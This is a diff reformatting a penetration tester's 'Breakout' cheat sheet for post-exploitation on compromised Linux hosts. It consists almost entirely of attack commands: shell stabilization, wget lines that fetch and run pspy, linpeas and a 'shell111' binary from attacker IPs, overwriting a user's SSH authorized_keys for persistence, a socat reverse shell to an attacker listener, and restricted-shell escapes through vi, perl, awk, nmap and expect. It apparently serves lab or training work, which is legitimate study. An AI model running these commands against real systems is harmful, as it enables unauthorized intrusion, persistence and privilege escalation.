@@ -1,94 +1,118 @@
-Out of the gate.
+# Breakout
 
-python -c 'import pty; pty.spawn("/bin/bash")'
-OR
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin
-export TERM=xterm-256color
-alias ll='ls -lsaht --color=auto'
-Keyboard Shortcut: Ctrl + Z (Background Process)
-stty raw -echo ; fg ; reset
+### Initial Access and Shell Stabilization  
+
+Don't forget that you can always set the terminal history to be infinite, and the keystroke scroll back. 
+
+Grab a valid tty.
+
+What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD
+
+Want a color terminal to easily tell apart file permissions? Directories? Files?
+
+Fastest way to list out the files in a directory, show size, show permissions, human readable.
+
+Make this shell stable.
+
+```bash 
+# Python method to spawn a bash shell   
+python -c 'import pty; pty.spawn("/bin/bash")'  
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
+
+# Set environment variables 
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin  
+export TERM=xterm-256color  
+
+# Alias for enhanced listing
+alias ll='ls -lsaht --color=auto'   
+
+# Background the current process with Ctrl + Z  
+# Then prepare the terminal 
+stty raw -echo; fg; reset
+(stty size)
 stty columns 200 rows 200
 stty columns 150 rows 150
+```
 
-python -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm-256color && alias ll='ls -lsaht --color=auto'
-python3 -c 'import pty; pty.spawn("/bin/bash")' ; export TERM=xterm-256color ; alias ll='ls -lsaht --color=auto'
+### File Transfer and Execution 
 
-wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://192.168.45.178:8000/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/pspy;
-wget http://192.168.45.178:80/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://192.168.45.178:80/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;wget http://192.168.45.178:80/shell111 -O /dev/shm/shell111;chmod +x /dev/shm/shell111;/dev/shm/pspy;
-wget http://192.168.45.178:80/shell111 -O /dev/shm/shell111;chmod +x /dev/shm/shell111;/dev/shm/shell80&
-wget http://192.168.45.178:8000/authorized_keys -O /home/kathleen/.ssh/authorized_keys
-http://192.168.45.178:3305/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://192.168.45.178:3305/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/pspy;
-wget http://10.10.14.8:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://10.10.14.8:8000/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/pspy;
-/dev/shm/linpeas.sh
+```bash 
+# Download and execute tools
+wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy; chmod +x /dev/shm/pspy 
+wget http://192.168.45.178:8000/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/linpeas.sh 
+/dev/shm/pspy   
 
-// Pimp out linux shell
-which socat
-socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
+# Multiple sources and tools
+wget http://10.10.14.8:8000/pspy64 -O /dev/shm/pspy; chmod +x /dev/shm/pspy 
+wget http://10.10.14.8:8000/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/linpeas.sh 
+/dev/shm/linpeas.sh 
+``` 
 
-(stty size)
- 
-* Don't forget that you can always set the terminal history to be infinite, and the keystroke scroll back. 
+### SSH Key Manipulation
 
-* Grab a valid tty.
-* What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD
-* Want a color terminal to easily tell apart file permissions? Directories? Files?
-* Fastest way to list out the files in a directory, show size, show permissions, human readable.
-* Make this shell stable.
+```bash 
+# Replace authorized_keys for user  
+wget http://192.168.45.178:8000/authorized_keys -O /home/kathleen/.ssh/authorized_keys  
+``` 
 
+### Reverse Shell Setup 
 
+```bash 
+# Check if socat is available   
+which socat 
 
-Is this rbash (Restricted Bash)? PT1
-$ vi
-:set shell=/bin/sh
-:shell
+# Setup reverse shell listener on Kali  
+socat file:`tty`,raw,echo=0 tcp-listen:4444 
 
-$ vim
-:set shell=/bin/sh
-:shell
+# Connect back from the victim machine  
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444  
+``` 
 
-Is this rbash (Restricted Bash)? PT2
-(This requires ssh user-level access)
+### Restricted Shell Bypass 
+
+```bash 
+# Vim method to escape restricted bash (rbash)  
+vi :set shell=/bin/sh   
+:shell  
+
+# SSH method to bypass restricted shell 
 ssh user@127.0.0.1 "/bin/sh"
 rm $HOME/.bashrc
 exit
-ssh user@127.0.0.1
-(Bash Shell)
+``` 
 
-Is python present on the target machine?
-python -c 'import pty; pty.spawn("/bin/bash")'
+### Alternative Shells  
+
+```bash 
+# Check and use Python if available 
+python -c 'import pty; pty.spawn("/bin/bash")'  
 python -c 'import pty; pty.spawn("/bin/sh")'
 
-Is perl present on the target machine?
-perl -e 'exec "/bin/bash";'
-perl -e 'exec "/bin/sh";'
+# Is perl present?
+perl -e 'exec "/bin/bash";' 
+perl -e 'exec "/bin/sh";'   
 
-Is AWK present on the target machine?
+# Is AWK present?
 awk 'BEGIN {system("/bin/bash -i")}'
-awk 'BEGIN {system("/bin/sh -i")}'
+awk 'BEGIN {system("/bin/sh -i")}'  
 
-Is ed present on the target machines?
-ed
-!sh
+# Is ed present?
+ed !sh  
 
-IRB Present on the target machine?
-exec "/bin/sh"
+# Is IRB present?
+exec "/bin/sh"  
 
-Is Nmap present on the target machine?
-nmap --interactive
-nmap> !sh
+# Nmap ?
+nmap --interactive  
+nmap> !sh   
 
-Expect:
-
-expect -v
-  expect version 5.45.4
-  
-$ cat > /tmp/shell.sh <<EOF
-#!/usr/bin/expect
-spawn bash
+# expect ?
+expect -v   
+cat > /tmp/shell.sh <<EOF   
+#!/usr/bin/expect   
+spawn bash  
 interact
-EOF
-
-$ chmod u+x /tmp/shell.sh
-$ /tmp/shell.sh
+EOF 
+chmod u+x /tmp/shell.sh 
+/tmp/shell.sh   
+```
